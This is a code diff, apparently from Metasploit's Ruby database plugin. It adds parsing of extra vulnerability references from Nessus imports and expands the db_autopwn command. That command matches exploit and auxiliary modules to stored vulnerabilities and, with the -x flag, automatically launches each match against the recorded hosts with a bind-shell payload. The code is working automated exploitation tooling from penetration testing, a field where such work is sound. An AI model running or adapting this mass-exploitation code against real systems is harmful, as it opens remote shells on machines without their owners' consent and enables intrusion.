@@ -116,7 +116,13 @@ module Db
 						refs[ 'BID-' + r ] = true
 					end
 				end
-				
+
+				if (data =~ /^Other references : (.*)$/)
+					$1.split(',').map { |r| r.strip }.each do |r|
+						refs[ r ] = true
+					end
+				end
+								
 				refs[ 'NSS-' + nasl.to_s ] = true
 								
 				vuln = framework.db.get_vuln(nil, service, 'NSS-' + nasl.to_s, data)
@@ -131,26 +137,106 @@ module Db
 		end
 		
 		def cmd_db_autopwn(*args)
+		
+			print_status("Analyzing module and vulnerability data...")
+			stamp = Time.now.to_f
+			vcnt  = 0
+			rcnt  = 0
+			
 			matches = {}
+			
+			# Scan all exploit modules for matching references
 			framework.exploits.each_module do |n,m|
 				e = m.new
 				e.references.each do |r|
-					next if r.ctx_id == 'URL'
+					rcnt += 1
+					
 					ref_name = r.ctx_id + '-' + r.ctx_val
-					ref = framework.db.has_ref(ref_name)
+					ref = framework.db.has_ref?(ref_name)
 					next if not ref
+
 					ref.vulns.each do |vuln|
-						xport = vuln.service.port
-						xprot = vuln.service.proto
-						xhost = vuln.service.host.address
-						matches[[xport,xprot,xhost,n]]=true
+						vcnt  += 1
+						serv  = vuln.service
+						xport = serv.port
+						xprot = serv.proto
+						xhost = serv.host.address
+						matches[[xport,xprot,xhost,'exploit/'+n]]=true
 					end
 				end
 			end
 			
-			matches.each_key do |xref|
-				print_status("exploit/#{xref[3]} RPORT=#{xref[0].to_s} RHOST=#{xref[2].to_s}")
+			# Scan all auxiliary modules for matching references
+			framework.auxiliary.each_module do |n,m|
+				e = m.new
+				e.references.each do |r|
+					rcnt += 1
+					
+					ref_name = r.ctx_id + '-' + r.ctx_val
+					ref = framework.db.has_ref?(ref_name)
+					next if not ref
+
+					ref.vulns.each do |vuln|
+						vcnt  += 1
+						serv  = vuln.service
+						xport = serv.port
+						xprot = serv.proto
+						xhost = serv.host.address
+						matches[[xport,xprot,xhost,'auxiliary/'+n]]=true
+					end
+				end
 			end
+			
+			print_status("Analysis completed in #{(Time.now.to_f - stamp).to_s} seconds (#{vcnt.to_s} vulns / #{rcnt.to_s} refs)")
+			
+			case args[0]		
+			when '-t', nil
+				matches.each_key do |xref|
+					print_status("Try #{xref[3]} against #{xref[2].to_s}:#{xref[0].to_s}")
+				end
+
+			when '-x'
+				matches.each_key do |xref|
+					print_status("Launching #{xref[3]} against #{xref[2].to_s}:#{xref[0].to_s}...")
+					begin
+						mod = nil
+						
+						if ((mod = framework.modules.create(xref[3])) == nil)
+							print_status("Failed to initialize #{xref[3]}")
+							next
+						end
+						
+						mod.datastore['RHOST'] = xref[2]
+						mod.datastore['RPORT'] = xref[0].to_s
+						mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
+						mod.datastore['LPORT']   = (rand(0xfff) + 4000).to_s
+
+						begin
+							case mod.type
+							when MODULE_EXPLOIT
+								session = mod.exploit_simple(
+									'Payload'        => mod.datastore['PAYLOAD'],
+									'LocalInput'     => driver.input,
+									'LocalOutput'    => driver.output,
+									'RunAsJob'       => true) if mod.autofilter()
+							when MODULE_AUX
+								session = mod.run_simple(
+									'LocalInput'     => driver.input,
+									'LocalOutput'    => driver.output,
+									'RunAsJob'       => true) if mod.autofilter()					
+							end
+						rescue ::Exception
+							print_status(" >> Exception during launch from #{xref[3]}: #{$!.to_s}")
+						end
+						
+					rescue ::Exception
+						print_status(" >> Exception from #{xref[3]}: #{$!.to_s}")
+					end
+				end	
+			else
+				print_status("Usage: db_autopwn [-t]|[-x]")
+			end
+		
 		end
 
 end
